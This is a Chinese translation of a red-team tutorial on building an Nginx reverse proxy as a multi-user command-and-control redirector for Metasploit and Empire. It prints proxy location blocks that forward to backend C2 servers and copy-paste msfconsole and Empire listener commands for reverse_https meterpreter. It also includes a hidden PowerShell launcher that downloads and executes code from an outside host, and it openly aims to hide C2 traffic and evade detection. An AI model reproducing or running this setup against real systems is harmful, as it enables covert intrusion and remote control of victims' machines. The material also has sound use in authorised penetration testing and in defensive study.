> 原文链接: https://www.anquanke.com//post/id/84838 


# 【技术分享】多工具多用户的HTTP代理


                                阅读量   
                                **110937**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：安全客
                                <br>原文地址：[https://www.swordshield.com/2016/10/multi-tool-multi-user-http-proxy/](https://www.swordshield.com/2016/10/multi-tool-multi-user-http-proxy/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01192c67fc984c4388.png)](https://p0.ssl.qhimg.com/t01192c67fc984c4388.png)

**翻译：**[**WisFree******](http://bobao.360.cn/member/contribute?uid=2606963099)

**稿费：200RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆<strong>[<strong>网页版**](http://bobao.360.cn/contribute/index)</strong>在线投稿</strong>

<br>

**基础知识**

目前，很大一部分流行的命令控制（C&amp;C）工具都是通过HTTP来传输网络通信数据的，例如Metasploit和Empire。对于C&amp;C工具而言，之所以HTTP协议是一个更加高效的选择，主要是因为这个协议几乎适用于目前所有类型的通信网络以及网络设备。除此之外，使用“HTTP over TLS”可以为这些工具添加一个额外的安全层，因为这项技术将会使我们更加难以去检测到C&amp;C流量。如果企业或组织拥有一个配置正确的Web代理，那么这个能够执行SSL/TLS检查的代理将会帮助安全技术人员更好地检测C&amp;C流量。但是在我所帮助测试过的组织中，并没有多少组织采取了这样的安全措施。

为了掩饰所有的非法操作，通过HTTP协议传输的C&amp;C流量应该通过80端口或者443端口来发送。如果使用类似8080这样的特殊端口来发送C&amp;C数据的话，不仅会引起管理员怀疑，而且也逃不过安全防护软件的检测。就我个人而言，我喜欢在同一台主机中使用多种类型的工具。如果我要在一台主机中同时使用Empire和Metasploit的网络传输模块，我将总共需要三个网络端口，一般来说我会选择使用80端口、8080端口、以及443端口。但是现在，我想要让所有的网络流量全部通过端口443来发送。因此，我现在就要使用Sword&amp;Shield所提供的安全分析服务了，这样我就可以使用一个C&amp;C代理来完成所有的分析操作。

接下来，我打算使用Nginx来搭建一个反向代理服务器。如下图所示，这样我们就可以使用一台Web服务器来同时处理多用户-多工具的情况了。当代理服务器配置完成之后，代理规则将会负责对发送至C2服务器端口的流量进行划分。除此之外，这样的配置也可以隐藏C&amp;C服务器的“真实身份”（实际主机）。Nginx不仅安装和配置非常简单，而且操作起来也非常便捷。多用户-多工具的C&amp;C代理架构图如下图所示：

[![](https://p0.ssl.qhimg.com/t0156e4a3c4228324ed.png)](https://p0.ssl.qhimg.com/t0156e4a3c4228324ed.png)

<br>

**Nginx的安装与配置**

首先，将你最喜欢的Linux发行版安装至一台VPS服务器中，你愿意的话也可以将其安装在自己的服务器里。为了方便大家理解，我选择将Ubuntu 16.10安装在一台VPS主机中。如果各位同学在Nginx的安装和运行上遇到了困难的话，可以参阅这份教程[[教程获取]](https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-16-04)。通过配置之后，我的服务器仅启用了80端口，并且只允许网络流量通过443端口来发送。

在测试开始之前，我们一定要将Nginx配置好，否则代理服务器将会不知道如何去处理那些通信连接。为了防止暴力破解攻击，我们要为每一个分析器分配一个GUID。你可以点击[这里](https://www.guidgenerator.com/)来生成相应的GUID。我所生成的GUID如下表所示：

[![](https://p2.ssl.qhimg.com/t01fc49343463c96f50.png)](https://p2.ssl.qhimg.com/t01fc49343463c96f50.png)

我总共设置了三个分析器，每一个分析器的相关配置信息如下所示：

```
#Analyst 1
location /E0922BB0-684B-4ED3-967E-85D08880CFD5/ `{`
      proxy_redirect off;
      #Empire
      location /E0922BB0-684B-4ED3-967E-85D08880CFD5/e/ `{`
        proxy_pass https://205.232.71.92:443;
      `}`
      #Metasploit
      location /E0922BB0-684B-4ED3-967E-85D08880CFD5/m/ `{`
        #Metasploit exploit/multi/script/web_delivery
        location /E0922BB0-684B-4ED3-967E-85D08880CFD5/m/Delivery `{`
          proxy_pass https://205.232.71.92:8080;
        `}`
        #Metasploit Payload windows/x64/meterpreter/reverse_https
        location /E0922BB0-684B-4ED3-967E-85D08880CFD5/m/Pwned `{`
          proxy_pass https://205.232.71.92:80;
        `}`
      `}`
`}`
#Analyst 2
location /30061CD8-0CEE-4381-B3F8-B50DCACA4CC8/ `{`
      proxy_redirect off;
      #Empire
      location /30061CD8-0CEE-4381-B3F8-B50DCACA4CC8/e/ `{`
        proxy_pass https://1.2.3.5:443;
      `}`
      #Metasploit
      location /30061CD8-0CEE-4381-B3F8-B50DCACA4CC8/m/ `{`
        #Metasploit exploit/multi/script/web_delivery
        location /30061CD8-0CEE-4381-B3F8-B50DCACA4CC8/m/Delivery `{`
          proxy_pass https://1.2.3.5:8080;
        `}`
        #Metasploit Payload windows/x64/meterpreter/reverse_https
        location /30061CD8-0CEE-4381-B3F8-B50DCACA4CC8/m/Pwned `{`
          proxy_pass https://1.2.3.5:80;
        `}`
      `}`
`}`
#Analyst 3
location /6012A46E-C00C-4816-9DEB-7B2697667D92/ `{`
      proxy_redirect off;
      #Empire
      location /6012A46E-C00C-4816-9DEB-7B2697667D92/e/ `{`
        proxy_pass https://1.2.3.6:443;
      `}`
      #Metasploit
      location /6012A46E-C00C-4816-9DEB-7B2697667D92/m/ `{`
        #Metasploit exploit/multi/script/web_delivery
        location /6012A46E-C00C-4816-9DEB-7B2697667D92/m/Delivery `{`
          proxy_pass https://1.2.3.6:8080;
        `}`
        #Metasploit Payload windows/x64/meterpreter/reverse_https
        location /6012A46E-C00C-4816-9DEB-7B2697667D92/m/Pwned `{`
          proxy_pass https://1.2.3.6:80;
        `}`
      `}`
`}`
```

由于我们要让Nginx需要区分出Metasploit和Empire的请求，所以我突发奇想，打算用‘m’来代表Metasploit，用‘e’来代表Empire。Empire的C2请求如下所示：

```
https://myc2proxy.com/E0922BB0-684B-4ED3-967E-85D08880CFD5/e/index.asp
```

现在，既然我们已经可以确定传入的HTTP请求所使用的语句了，那么Nginx就需要将每一个请求转发至适当的分析代理服务器中，这项操作可以使用Nginx配置文件（/etc/nginx/sites-enabled/default）中的定位指令来完成。在这篇文章中，我们要为每一个分析器分别设置四个定位指令。在上面这段代码中，最外层的指令将会与分析器的GUID进行匹配。内层的定位指令主要用来匹配针对特定工具的请求，例如‘e’（Empire）和‘m’（Metasploit）。Metasploit的定位指令包含两个子定位指令，这两个指令可以用来匹配传入Metasploit特定模块和监听器的网络请求。

现在，C&amp;C代理服务器应该配置完成并且可以正常运行了。如果配置无误的话，我们将只能使用TLS连接和端口443来与服务器进行通信。

<br>

**Metasploit的安装与配置**

众所周知，Metasploit提供了很多的功能模块，我们可以使用这些模块来与目标用户的计算机建立C2连接。我个人比较喜欢使用“exploit/multi/script/web_delivery”模块来作为launcher。我之所以非常喜欢这个模块，主要是因为它可以将meterpreter（ShellCode）注入至目标主机的内存中。这是一种非常理想的情况，因为你可以直接使用目标主机中的内置工具来进行操作，而不必向目标主机发送任何的文件。

接下来，我们要加载Nginx配置文件所需要使用的Metasploit模块，并使用URIPATH来对其进行设置。需要注意的是，自带的payload handler必须被禁用，因为我们要单独配置这些payload。在配置这个模块的过程中，payload使用的是“windows/x64/meterpreter/reverse_https”，然后将LHOST和LPORT设置为C2代理服务器的IP地址和端口号。请注意，这里可千万不要设置成后台C2服务器的IP地址了。除此之外，我们还要设置与payload（例如Pwned）和Nginx中的指令相匹配的LURI。虽然相应的监听器根本不会启动，但我们仍然要去配置这些payload。因为接下来当模块被执行之后，我们要使用这些设置来生成显示在屏幕中的启动命令。我们可以将下面给出的这段指令直接复制粘贴到msfconsole中来配置并启动该模块：

```
use exploit/multi/script/web_delivery
set URIPATH /E0922BB0-684B-4ED3-967E-85D08880CFD5/m/Delivery
set DisablePayloadHandler true
set SSL True
set TARGET 2
set payload windows/x64/meterpreter/reverse_https
set LHOST myc2proxy.com
set LPORT 443
set LURI /E0922BB0-684B-4ED3-967E-85D08880CFD5/m/Pwned
run –j
```

下图显示的是Metasploit中web_delivery模块的配置信息：

[![](https://p1.ssl.qhimg.com/t01360cb7ea315c4984.png)](https://p1.ssl.qhimg.com/t01360cb7ea315c4984.png)

当模块被执行后，屏幕中会显示一个包含有启动代码的字符串。请注意：必须将网络端口由8080改为443，否则之后将无法再进行修改了。除此之外，我们还必须手动去修改，因为我们的C2代理只会接受来自端口443的通信请求。这个字符串如下所示：

```
powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback=`{`$true`}`;$o=new-object net.webclient;$o.proxy=[Net.WebRequest]::GetSystemWebProxy();$o.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $o.downloadstring('https://myc2proxy.com:8080/E0922BB0-684B-4ED3-967E-85D08880CFD5/m/Delivery');
```

接下来，将LHOST设置为0.0.0.0，LPORT设置为80（端口号的设置可以根据后台C2服务器来选择）。我们还需要配置OverrideLHOST、OverrideLPORT、以及OverrideRequestHost来确保payload可以直接与C2代理服务器进行对话。我们可以将下面给出的命令直接复制粘贴到msfconsole中来配置并启动该模块：

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 80
set LURI /E0922BB0-684B-4ED3-967E-85D08880CFD5/m/Pwned
set OverrideLHOST myc2proxy.com
set OverrideLPORT 443
set OverrideRequestHost true
set ExitOnSession false
run –j
```

下图显示的是reverse_https的payload配置信息：

[![](https://p1.ssl.qhimg.com/t01c539aaf2b4dfa49c.png)](https://p1.ssl.qhimg.com/t01c539aaf2b4dfa49c.png)

<br>

**Empire的安装与配置**

虽然Empire是我最喜欢的一款工具，但是在配置代理服务器的过程中，使用Empire之前还是有几个障碍需要克服的，相比之下Metasploit的配置和使用就简单多了。在PowerShell v1中，初始链接序列所使用STAGE0、STAGE1和STAGE2是在empire.db的配置表中定义的。在我看来，我们是无法在Empire CLI中修改这部分数据的，所以我们必须直接手动修改数据库。但是，PowerShell Empire v2并没有使用这种架构。我建议各位同学使用git来下载Empire v2分支，命令如下：

```
cd /opt;git clone -b 2.0_beta https://github.com/adaptivethreat/Empire.git
```

下载完成之后，启动应用。由于Empire监听器所使用的端口必须与C2代理服务器的监听端口相同，所以Empire必须使用端口443和HTTPS协议。我们可以直接将下面给出的这段命令复制粘贴进Empire中来配置监听器：

```
listeners
uselistener http
set DefaultProfile /E0922BB0-684B-4ED3-967E-85D08880CFD5/e/admin/get.php,/E0922BB0-684B-4ED3-967E-85D08880CFD5/e/news.asp,/E0922BB0-684B-4ED3-967E-85D08880CFD5/e/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0;rv:11.0) like Gecko
set Name EmpireC2
set CertPath /opt/Empire/data/empire.pem
set Host https://myc2proxy.com
set Port 443
execute
launcher powershell
```

Empire监听器的配置信息如下图所示：

[![](https://p3.ssl.qhimg.com/t0100a987807485d585.png)](https://p3.ssl.qhimg.com/t0100a987807485d585.png)

<br>

**执行**

现在，我们已经为Nginx C2代理配置好了一个用于分析数据流量的后台C2服务器了。接下来，我们要在测试主机中执行我们所生成的其中一个launcher，你将会在后台C2服务器中看到测试主机的shell。为了增加安全措施，配置后台C2服务器只允许当前C2代理访问。

<br>

**结论**

代理可以用来保持后台服务的匿名性。当你需要在某个网络中进行命令控制活动时，代理所提供的这种特性是非常有用的。由于HTTPS的通信数据足够安全，因此现在越来越多的网络都开始使用HTTPS来进行通信了。但是，这也将有助于我们躲避安全产品的检测。

[![](https://p3.ssl.qhimg.com/t01f61186d5d54202e2.jpg)](https://p3.ssl.qhimg.com/t01f61186d5d54202e2.jpg)[![](https://p2.ssl.qhimg.com/t01cc5d036b04c82003.jpg)](https://p2.ssl.qhimg.com/t01cc5d036b04c82003.jpg)
